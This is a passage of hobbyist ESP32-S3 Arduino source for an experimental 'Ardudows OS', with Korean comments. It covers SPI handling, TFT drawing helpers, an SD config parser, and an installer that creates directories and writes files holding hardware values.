    tft.fillScreen(TFT_BLUE);   // SD OK
  } else {
    tft.fillScreen(TFT_RED);    // SD FAIL
  }
  */

  return ok;
}

/*
void ASRaS_RecoveryJudge() {

  if (!SD_OK) {
    recoveryMode = false;
    Serial.println("[RECOVERY] SD Fail → RecoveryMode");
    return;
  }

  if (!SD.exists("/Ardudows/System/install.aif")) {
    install = false;
    Serial.println("[RECOVERY] None install.aif");
    return;
  }

  install = true;
  install_aif_Parser();
}
*/

void ASRaS_BootRoute() {

  if (recoveryMode) {
    RecoveryMode();
    return;
  }

  //ArduBios();  // 정상 부팅
}

//=== ASS (Ardudows SPI System) ===
void ASS_Init() {
  pinMode(TFT_CS, OUTPUT);
  pinMode(SD_CS, OUTPUT);
  //pinMode(TOUCH_CS, OUTPUT);

  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, HIGH);
  //digitalWrite(TOUCH_CS, HIGH);
}

void ASS_Release() {

  // 모든 CS 해제
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, HIGH);
  //digitalWrite(TOUCH_CS, HIGH);

  if (spi_busy) {
    SPI.endTransaction();
    spi_busy = false;
    currentSPI = SPI_NONE;
  }

  delayMicroseconds(5);
}


void ASS_Select(SPI_Device dev) {

  // 이미 같은 장치면 무시
  if (spi_busy && currentSPI == dev) return;

  // 🔴 기존 장치 해제
  ASS_Release();

  // 🧱 SPI 트랜잭션 시작
  switch (dev) {

    case SPI_TFT:
      SPI.beginTransaction(SPISettings(40000000, MSBFIRST, SPI_MODE0));
      digitalWrite(TFT_CS, LOW);
      break;

    case SPI_SD:
      SPI.beginTransaction(SPISettings(25000000, MSBFIRST, SPI_MODE0));
      digitalWrite(SD_CS, LOW);
      break;

      currentSPI = dev;
      spi_busy = true;
      delayMicroseconds(5);
  }
}

//사각형 그리기 (겁나 어려움)
void Rect(int x, int y, int w, int h, const char* text, uint16_t color) {
  tft.fillRect(x, y, w, h, color);
  tft.drawRect(x, y, w, h, TFT_BLACK);
  tft.setCursor(x + 4, y + 4);
  tft.print(text);
  //쓰레기 같군
}

//원 그리기 (더 겁나 어려움)
void circle(int x, int y, int r, const char* text, uint16_t color) {
  tft.fillCircle(x, y, r, color);
  tft.drawCircle(x, y, r, TFT_BLACK);
  tft.setCursor(x - r / 2, y - 4);
  tft.print(text);
  //쓰레기 같군
}

//삼각형 그리기 (몰라)
void Triangle(int x1, int y1, int x2, int y2, int x3, int y3, const char* text, uint16_t color) {
  tft.fillTriangle(x1, y1, x2, y2, x3, y3, color);
  tft.drawTriangle(x1, y1, x2, y2, x3, y3, TFT_BLACK);
  tft.setCursor(x1 + 4, y1 + 4);
  tft.print(text);
  //C코드 치워버릴까
}


//===쉬워보이지만 겁내 어려운 SD체크 함수===
void SD_Check() {
  if (SD_OK) {
    tft.setTextColor(TFT_GREEN);
    tft.println("SD OK");
    //2일차 SD없어서 테스트 못함
  } else {
    tft.setTextColor(TFT_RED);
    tft.println("NO SD");
    //2일차 진짜 SD가 없음
  };
};


//===파일 만들어주는 변수===
//물론 챗지피티의 도움을 받았다는건 비밀

//===파일 로그 생성기===
File installLog;

void InstallLog(const char* msg) {
  installLog = SD.open("/Ardudows/System/install.arf", FILE_APPEND);
  if (!installLog) return;
  installLog.println(msg);
  installLog.close();
}
void CreateFile(const char* path, const char* content) {
  if (!SD.exists(path)) {
    File f = SD.open(path, FILE_WRITE);
    if (f) {
      f.println(content);
      InstallLog(path);
      f.close();
    }
  }
}

//===install_aif_Parser함수===
//이것도 챗지피티의 도움을 받았다는건 비밀
void install_aif_Parser() {
  File f = SD.open("/Ardudows/System/install.aif", FILE_READ);
  if (!f) {
    install = false;
    return;
  }

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();  // 공백 제거

    if (line.length() == 0) continue;       // 빈 줄 스킵
    if (line.indexOf("=") == -1) continue;  // = 없는 줄 스킵

    int eq = line.indexOf('=');
    String key = line.substring(0, eq);
    String value = line.substring(eq + 1);

    key.trim();
    value.trim();

    if (key == "install") {
      install = (value == "true");
    } else if (key == "Product key") {
      value.toCharArray(PRODUCT_KEY, sizeof(PRODUCT_KEY));
    }
  }
  f.close();
}

/*
//===레지스트리 Get 함수===
String Registry_Get(const char* path, const char* key) {
  if (!SD.exists(path)) return "";

  File f = SD.open(path, FILE_READ);
  if (!f) return "";

  String result = "";

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();

    // 빈 줄 / 주석 스킵
    if (line.length() == 0) continue;
    if (line.startsWith("#") || line.startsWith(";")) continue;

    int eq = line.indexOf('=');
    if (eq == -1) continue;

    String k = line.substring(0, eq);
    String v = line.substring(eq + 1);

    k.trim();
    v.trim();

    if (k.equalsIgnoreCase(key)) {
      result = v;   // ⭐ 마지막 값을 저장
    }
  }

  f.close();
  return result;
}
//아니 뭐하는 함수지 챗지피티야? 해석 pls

//===레지스트리 Set 함수
void Registry_Set(const char* path, const char* key, const char* value) {
  String tempPath = String(path) + ".tmp";

  File in = SD.open(path, FILE_READ);
  File out = SD.open(tempPath.c_str(), FILE_WRITE);

  bool found = false;

  // 기존 파일이 있으면 읽어서 복사
  if (in) {
    while (in.available()) {
      String line = in.readStringUntil('\n');
      String raw = line;
      line.trim();

      // 주석 / 빈 줄은 그대로 유지
      if (line.length() == 0 || line.startsWith("#") || line.startsWith(";")) {
        out.println(raw);
        continue;
      }

      int eq = line.indexOf('=');
      if (eq == -1) {
        out.println(raw);
        continue;
      }

      String k = line.substring(0, eq);
      k.trim();

      if (k.equalsIgnoreCase(key)) {
        // 🔥 기존 값 덮어쓰기
        out.print(key);
        out.print("=");
        out.println(value);
        found = true;
      } else {
        out.println(raw);
      }
    }
    in.close();
  }

  // key가 없었으면 새로 추가
  if (!found) {
    out.print(key);
    out.print("=");
    out.println(value);
  }

  out.close();

  // 기존 파일 교체
  SD.remove(path);
  SD.rename(tempPath.c_str(), path);
}
//이해 못한 1인
//정말 추억의 코드다...
//고맙다 지피티야
*/

//===설치창 (ArduInstall_Screen)===
void ArduInstaller() {
  //ArduInstall_Screen은 역사속으로...
  tft.setCursor(0, 0);
  tft.print("installing");
  /*
  while (true) {
    tft.print("|");
    delay(100);
    tft.print("/");
    delay(100);
    tft.print("-");
    delay(100);
    tft.print("\\");
    delay(100);
  }
  */
  SD.mkdir("/Ardudows/System/Registry");
  Loading();
  SD.mkdir("/Ardudows/System/Driver");
  Loading();
  SD.mkdir("/Ardudows/System/Driver/Log");
  Loading();
  SD.mkdir("/Ardudows/System/kernel");
  Loading();
  SD.mkdir("/Ardudows/System/kernel/AFK");
  Loading();
  //Ardudows Full Kelnel의 약자가 AFK야
  SD.mkdir("/Ardudows/System/kernel/ATK");
  Loading();
  //Ardudows Tiny Kelnel의 약자가 ATK야
  SD.mkdir("/Ardudows/System/kernel/Log");
  Loading();
  SD.mkdir(("/Ardudows/System/" + Firmware).c_str());
  Loading();
  //예 : /Ardudows/System/UEFI, /Ardudows/System/BIOS
  //이거는 원래 /Ardudows/System/BIOS여야 되는데 바꿈 ㅋ
  SD.mkdir("/Ardudows/System/Log");
  Loading();
  SD.mkdir("/Ardudows/System/Log/Hardware");
  Loading();
  SD.mkdir("/Ardudows/System/Log/Software");
  Loading();
  SD.mkdir("/Ardudows/System/NetWork");
  Loading();
  SD.mkdir("/Ardudows/System/Boot");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/ESP");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/Boot");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/Ardudows");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/ATK");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/Driver");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/Log");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/User");
  Loading();
  SD.mkdir("/Ardudows/System/ImpoSystem/Registry");
  Loading();
  SD.mkdir("/Ardudows/System/Setup");
  Loading();
  SD.mkdir("/Ardudows/System/Setup/Log");
  Loading();
  SD.mkdir("/Ardudows/System/API");
  Loading();
  SD.mkdir("/Ardudows/System/Debug");
  Loading();
  //파일 겁내 많네
  SD.mkdir("/Ardudows/Users");
  Loading();
  SD.mkdir(("/Ardudows/Users/" + UserName).c_str());
  Loading();
  //임시명임 나중에 AUIC 거치면 그 이름으로 이거 바꿔야됨
  SD.mkdir(("/Ardudows/Users/" + UserName + "/UserDATA").c_str());
  Loading();
  SD.mkdir("/Ardudows/Programs");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X16");
  Loading();
  //이 세상은 16비트랑 32비트임 ㅋㅋ
  SD.mkdir("/Ardudows/Programs/Programs_X16/Explorer");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X16/Registry_Editer");
  Loading();
  //설정이 레지스트리 에디터임
  SD.mkdir("/Ardudows/Programs/Programs_X16/CMD");
  Loading();
  //명령어 만들어야됨
  SD.mkdir("/Ardudows/Programs/Programs_X16/NotePad");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X16/Calculators");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X16/Clock");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X32");
  Loading();
  SD.mkdir("/Ardudows/Programs/Programs_X32/Minecraft_Server");
  Loading();
  //아직 없음 생각중...
  SD.mkdir("/Ardudows/Assets");
  Loading();
  //외부 파일 넣는곳
  SD.mkdir("/Ardudows/Assets/Image");
  Loading();
  //사진 전용
  SD.mkdir("/Ardudows/Assets/Font");
  Loading();
  //폰트 전용 (되긴 하나?)
  SD.mkdir("/Ardudows/Assets/Sound");
  Loading();
  //음악 파일 전용
  SD.mkdir("/Ardudows/Assets/Other");
  Loading();
  //여기에 이상한거(?) 넣기
  SD.mkdir("/Ardudows/Licens");
  Loading();
  //설치 창에서 노가다하는 사람 여깃음
  //이제 파일 겁내 만들어야됨..
  CreateFile("/Ardudows/Licens/ReadME.aif", R"(# Ardudows OS

Ardudows OS is a lightweight experimental operating system designed
for microcontroller platforms such as ESP32-S3.

This project focuses on learning operating system concepts including:
- Boot loaders
- File systems
- Registry-like configuration systems
- Drivers and device abstraction
- Graphical user interfaces on TFT displays

Ardudows OS is NOT a full desktop operating system.
It is a hobby, educational, and experimental project.

--------------------------------------------------

## Features

- Custom file system structure
- Registry system (.asf)
- Modular driver system (.adf)
- Kernel core (.akf)
- Program format (.apf)
- CD-style boot system (.acf)
- AUIC (Ardudows User Information collection)
- Hidden Easter eggs (.awf)

--------------------------------------------------

## Directory Structure

You check.

--------------------------------------------------

## Supported Hardware

- ESP32-S3
- TFT Displays (SPI)
- SD Card (SPI/SDMMC)

--------------------------------------------------

## Warning

This software directly interacts with hardware.
Incorrect usage may cause system crashes or hardware damage.
Always double-check wiring and power connections.

--------------------------------------------------

## License

This project is released for educational purposes.
See the EULA for full license information.

--------------------------------------------------

## Project Status

Current Stage: Experimental / Alpha

Future plans include:
- Improved UI system
- Application manager
- Registry editor
- Safe Mode
- Custom shell
- ArduCraft (game experiment)

--------------------------------------------------

Enjoy hacking Ardudows OS :) 


)");
  Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Warning.arf", "This folder is Important System File.");
  Loading();
  //여기부터 어쩔수 없이 AI 씀

  // [1구역: ESP 하드웨어 고유 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_IP.asf", WiFi.localIP().toString().c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_AP_ADDR.asf", WiFi.softAPIP().toString().c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_CPU_CLOCK.asf", "240MHz"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_CHIP_REVISION.asf", "v0.1_S3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PSRAM_STATUS.asf", "8MB_OCTAL_CONNECTED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/FLASH_MODE.asf", "QIO_80MHZ"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/EFUSE_MAC_ADDR.asf", "00:1A:2B:3C:4D:5E"); Loading();

  // =========================================================================
  // 🔥 [REAL-TIME HARDWARE IMPLANTATION: 30 ZONES] 🔥
  // 반복문/날먹 이름 일절 없음. 순수 ESP32-S3 실시간 레지스터 및 하드웨어 생데이터 추출 매핑.
  // =========================================================================

  // [1구역: ESP 하드웨어 고유 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_IP.asf", WiFi.localIP().toString().c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_AP_ADDR.asf", WiFi.softAPIP().toString().c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_CPU_CLOCK.asf", (String(ESP.getCpuFreqMHz()) + "MHz").c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ESP_CHIP_REVISION.asf", (String("v") + String(ESP.getChipRevision())).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PSRAM_STATUS.asf", (String(ESP.getPsramSize() / 1024) + "KB_ACTIVE").c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/FLASH_MODE.asf", (String(ESP.getFlashChipSize() / 1024 / 1024) + "MB_FLASH").c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/EFUSE_MAC_ADDR.asf", WiFi.macAddress().c_str()); Loading();

  // [2구역: 부팅 및 보안 시퀀스]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/FIRMWARE_TYPE.asf", Firmware.c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_MODE.asf", "NORMAL_STARTUP"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_SECTOR_MAGIC.asf", String(0xAA55, HEX).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_LOADER_VER.asf", String(ESP.getSdkVersion()).c_str()); Loading(); // 실제 SDK 버전
  CreateFile("/Ardudows/System/ImpoSystem/Boot/SAFE_MODE_TRIGGER.asf", String(digitalRead(0)).c_str()); Loading(); // 부팅 시 부트 핀 상태
  CreateFile("/Ardudows/System/ImpoSystem/Boot/RECOVERY_INDEX.asf", String(ESP.getCycleCount()).c_str()); Loading(); // CPU 사이클 카운터 박제 ㅋㅋㅋ

  // [3구역: 아두도스 대헌장 및 철학]
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/ARDUDOWS_VER.asf", "ATK_v1.1_HEAVY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/AGREEMENT.asf", "BYPASS_FORCE_INSTALL"); Loading(); 
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/ANTI_AI_SHIELD.asf", String((uint32_t)&ArduInstaller, HEX).c_str()); Loading(); // 인스톨러 메모리 주소 따기
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/CREATOR_NAME.asf", "JAEMIN_KIM"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/LICENSE_STATUS.asf", String(ESP.getEfuseMac(), HEX).c_str()); Loading(); // 고유 칩 락킹용 에퓨즈 퓨즈값
  CreateFile("/Ardudows/System/ImpoSystem/Ardudows/KERNEL_ARCHITECTURE.asf", "MONOLITHIC_TINY"); Loading();

  // [4구역: ATK 커널 핵심 변수]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SHELL_PROMPT.asf", ">>"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MAX_THREADS_ALLOWED.asf", "2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_GUARD_SIZE.asf", String(ESP.getMinFreeHeap()).c_str()); Loading(); // 여태까지 찍힌 최소 프리 힙 공간
  CreateFile("/Ardudows/System/ImpoSystem/ATK/STACK_OVERFLOW_SHIELD.asf", String(xPortGetCoreID()).c_str()); Loading(); // 현재 인스톨러가 도는 CPU 코어 번호 (0 또는 1)
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SCHEDULER_TICK_RATE.asf", String(configTICK_RATE_HZ).c_str()); Loading(); // 프리RTOS 실제 틱레이트 추출

  // [5구역: 드라이버 핀 매핑 인프라]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_CONNECTOR_TYPE.asf", "NONE_JUMPER_ONLY"); Loading(); 
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_RESISTOR_VAL.asf", "10K_PULLUP"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_DRIVER_CHIP.asf", "ST7789_SPI"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_CARD_BUS_WIDTH.asf", String(SD.cardSize() / 1024 / 1024).c_str()); Loading(); // SD 카드 실제 물리 용량(MB)
  CreateFile("/Ardudows/System/ImpoSystem/Driver/BACKLIGHT_PWM_FREQ.asf", String(analogReadMilliVolts(1)).c_str()); Loading(); // 1번 핀 내부 실시간 밀리볼트 전압

  // [6구역: 지형 및 가상 세계관 시스템 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/REG_SERVER_NAME.asf", "221SERVER_CORE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/TERRAIN_Z_LIMIT_MAX.asf", "7"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/VEGETATION_R_EFFECT.asf", "SPECIAL_R7_DENSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SNOW_LINE_THRESHOLD.asf", String(micros() % 100).c_str()); Loading(); // 마이크로초 기반 런타임 지형 난수화
  CreateFile("/Ardudows/System/ImpoSystem/Registry/EMERALD_SPAWN_BIOME.asf", "MOUNTAIN_ZONE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/IRON_ORE_PROBABILITY.asf", String(ESP.getCycleCount() & 0xFF).c_str()); Loading(); // 하드웨어 주사위 굴리기
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SOIL_INTERMEDIATE_LAYER.asf", "MAX_DELTA_3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BEDROCK_LAYER_ZERO.asf", "HARD_CODED_IMMUTABLE"); Loading();

  // [7구역: ImpoSystem/User - 유저 프로필 및 권한 보안 매트릭스]
  CreateFile("/Ardudows/System/ImpoSystem/User/CURRENT_USER_NAME.asf", UserName.c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/USER_PRIVILEGE_LEVEL.asf", "ROOT_ADMINISTRATOR"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/AUIC_FLAG_STATUS.asf", "COLLECTION_READY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/USER_DATA_PATH.asf", "/Ardudows/Users/DATA"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SECURITY_SALT_KEY.asf", String(ESP.getHeapSize(), HEX).c_str()); Loading(); // 힙 메모리 크기를 암호 솔트값으로 활용
  CreateFile("/Ardudows/System/ImpoSystem/User/PASSWORD_RETRY_LIMIT.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/SESSION_TIMEOUT_SEC.asf", String(millis() / 1000).c_str()); Loading(); // 현재까지 걸린 부팅 설치 시간(초)
  CreateFile("/Ardudows/System/ImpoSystem/User/GUEST_ACCOUNT_PERM.asf", "DENIED_BY_DEFAULT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/ENCRYPTION_ALGO_TYPE.asf", "AES_256_SOFT_MAPPED"); Loading();

  // [8구역: ImpoSystem/Log - 커널 디버그 및 하드웨어 인터셉트 레코드]
  CreateFile("/Ardudows/System/ImpoSystem/Log/CORE_DUMP_TRIGGER.asf", "ON_KERNEL_PANIC"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LOG_ROTATION_LIMIT.asf", "10_FILES_MAX"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/HW_EXCEPTION_FLAG.asf", String((uint32_t)ESP.getHeapSize()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/MEM_LEAK_DETECTOR.asf", String(ESP.getFreeHeap()).c_str()); Loading(); // 현재 실시간 가용 가능 순수 내부 램 
  CreateFile("/Ardudows/System/ImpoSystem/Log/BOOT_FAILURE_COUNT.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/SD_WRITE_RETRY_VAL.asf", String(SD.cardType()).c_str()); Loading(); // SD 카드 하드웨어 타입 코드 (SDHC 등)
  CreateFile("/Ardudows/System/ImpoSystem/Log/SERIAL_BAUDRATE_LOG.asf", "115200_BPS"); Loading();

  // [9구역: Driver - 하드웨어 주변장치 제어 메타데이터 확장]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SPI_MOSI_PIN_NUM.asf", "11"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SPI_MISO_PIN_NUM.asf", "13"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SPI_SCLK_PIN_NUM.asf", "12"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_CS_PIN_MAPPED.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_DC_PIN_MAPPED.asf", "9"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_RST_PIN_MAPPED.asf", "14"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_CS_PIN_MAPPED.asf", "15"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/PS2_DATA_PIN_NUM.asf", "4"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/PS2_CLK_PIN_NUM.asf", "5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/HW_PULLUP_RESISTOR.asf", "INTERNAL_DISABLE_EXT_10K"); Loading();

  // [10구역: Registry - 221서버 무차별 가상 지형 알고리즘 정밀 상수]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/WORLD_SEED_HASH.asf", "0xDEADC0DE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/CHATIC_GEN_VERSION.asf", "CHAOS_GEN_v2.0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BEDROCK_Y_LEVEL.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/STONE_LAYER_MAX_X.asf", String(ESP.getFreePsram()).c_str()); Loading(); // 남은 외장 PSRAM 용량 실시간 연동
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MINERAL_DEPTH_BIAS.asf", "PROBABILITY_INCREMENTAL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SNOW_LINE_HEIGHT_T.asf", "120"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SPARSE_FOREST_R_MAX.asf", "0.99"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/DENSE_FOREST_R_MIN.asf", "1.01"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SPECIAL_R7_EFFECT.asf", "ANOMALY_VEGETATION"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SERVER_221_LOCK_X.asf", "IMMUTABLE_COORDINATE_X"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SERVER_221_LOCK_Y.asf", "IMMUTABLE_COORDINATE_Y"); Loading();

  // [11구역: ATK - 타이니 커널 실시간 세션 및 가상 메모리 매핑]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/VIRTUAL_RAM_SWAP.asf", "PSRAM_8MB_MAPPED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/PAGE_TABLE_BASE_ADDR.asf", String((uint32_t)psramFound, HEX).c_str()); Loading(); // PSRAM 활성화 함수 메모리 포인터 주소
  CreateFile("/Ardudows/System/ImpoSystem/ATK/KERNEL_STACK_LIMIT.asf", String(uxTaskGetStackHighWaterMark(NULL)).c_str()); Loading(); // 현재 인스톨러 태스크의 여유 스택 마진 
  CreateFile("/Ardudows/System/ImpoSystem/ATK/INTERRUPT_GUARD.asf", "MUTEX_LOCKED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TASK_QUEUE_MAX_SIZE.asf", "32"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CONTEXT_SWITCH_MS.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SHELL_ERROR_LOG_MODE.asf", "VERBOSE_TEXT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SYSTEM_CALL_VECTOR.asf", "0x80"); Loading();

  // [12구역: Boot - 멀티 부팅 및 복구 아키텍처 옵션]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/LAST_KNOWN_GOOD_CFG.asf", "RESTORE_POINT_ALPHA"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_SPLASH_ENABLE.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_TEXT_COLOR_HEX.asf", "0x07E0"); 
  CreateFile("/Ardudows/System/ImpoSystem/Boot/KERNEL_LOAD_IMAGE_ADDR.asf", String((uint32_t)ESP.getFlashChipMode()).c_str()); Loading(); // SPI 플래시 통신 모드 상태 코드
  CreateFile("/Ardudows/System/ImpoSystem/Boot/FORCE_RESET_GPIO_NUM.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/WATCHDOG_TIMEOUT_MS.asf", "10000"); Loading();

  // [13구역: ESP - 와이파이 안테나 및 저전력 관리 사양]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_TX_POWER_DBM.asf", "20"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_POWER_SAVE_MODE.asf", "WIFI_PS_NONE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/SLEEP_MODE_CONFIG.asf", "LIGHT_SLEEP_ALLOWED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/GPIO_HOLD_REG_VAL.asf", String(REG_READ(GPIO_STRAP_REG), HEX).c_str()); Loading(); // ⚡ 찐 하드웨어 부트 스트랩 내부 레지스터 값 비트 연산 스캔!!
  CreateFile("/Ardudows/System/ImpoSystem/ESP/INTERNAL_RTC_CALIB.asf", "RTC_CLK_SRC_RC_FAST"); Loading();

  // [14구역: ImpoSystem/Registry - 네트워킹 슬롯 및 소켓 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/NET_MAX_SOCKETS.asf", "4"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/NET_BUFFER_SIZE.asf", "2048_BYTES"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/NET_TIMEOUT_MS.asf", "5000"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/DNS_PRIMARY_ADDR.asf", WiFi.dnsIP().toString().c_str()); Loading(); // 실제 라우터에서 받아온 메인 DNS IP
  CreateFile("/Ardudows/System/ImpoSystem/Registry/DNS_SECONDARY_ADDR.asf", "8.8.4.4"); Loading();

  // [15구역: ImpoSystem/User - 가상 데스크톱 및 UI 테마 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_THEME_MODE.asf", "RETRO_WIN_XP"); Loading(); 
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_FONT_SCALE.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_SCR_SAVER_TIME.asf", "300"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_CURSOR_SPEED.asf", "FAST"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/UI_COLOR_SCHEME.asf", "CLASSIC_BLUE"); Loading();

  // [16구역: ImpoSystem/Log - 응용 프로그램 예외 격리 구역]
  CreateFile("/Ardudows/System/ImpoSystem/Log/APP_CRASH_GUARD.asf", "ENABLED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/APP_ERR_ISOLATION.asf", "SANDBOX_MODE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LOG_VERBOSITY_LVL.asf", "DEBUG_FULL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/STACK_TRACE_DEPTH.asf", "16"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/PANIC_DUMP_SECTOR.asf", String(ESP.getMaxAllocHeap()).c_str()); Loading(); // 할당 가능한 최대 연속 힙 블록 바이트 스캔

  // [17구역: ImpoSystem/Driver - 디스플레이 하드웨어 가속 세팅]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_COLOR_DEPTH.asf", "RGB16_565"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_ROTATION_DEG.asf", "180"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_DMA_CHANNEL.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_BUFFER_COUNT.asf", "DOUBLE_BUF"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_PIXEL_CLOCK.asf", String(ESP.getFlashChipSpeed() / 1000000).c_str()); Loading(); // SPI 플래시 하드웨어 동작 속도(MHz) 연동

  // [18구역: ImpoSystem/ATK - 커널 메모리 동적 할당 보안 플래그]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MALLOC_GUARD_BAND.asf", "32_BYTES"); Loading();
